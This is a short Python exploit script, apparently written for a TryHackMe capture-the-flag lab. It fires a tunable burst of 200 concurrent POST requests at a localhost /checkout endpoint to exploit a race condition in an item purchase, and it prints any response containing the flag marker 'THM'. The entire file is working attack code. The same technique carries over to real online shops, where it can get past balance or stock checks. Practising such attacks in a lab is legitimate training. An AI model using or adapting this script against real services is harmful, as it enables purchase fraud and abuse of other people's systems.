#!/usr/bin/env python3
# Gatling Gun Exploit - High-intensity burst with micro-delays
# Tunable for different server response times

import requests
import concurrent.futures
import time

URL = "http://localhost:5000/checkout"
ITEM_ID = 2  # Bunny Plush
BURST_SIZE = 200
DELAY_BETWEEN_MS = 5  # Tune this!

payload = {"item_id": ITEM_ID}
headers = {"Content-Type": "application/json"}

def fire_shot():
    try:
        r = requests.post(URL, json=payload, headers=headers, timeout=3)
        if "THM" in r.text:
            return r.text
    except:
        pass
    return None

print(f"[*] Gatling Gun Mode: {BURST_SIZE} shots with {DELAY_BETWEEN_MS}ms delay")
start = time.time()

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = []
    for i in range(BURST_SIZE):
        futures.append(executor.submit(fire_shot))
        time.sleep(DELAY_BETWEEN_MS / 1000.0)
    
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"\n[!] HIT! {result}")

duration = time.time() - start
print(f"\n[+] Burst complete in {duration:.2f}s")
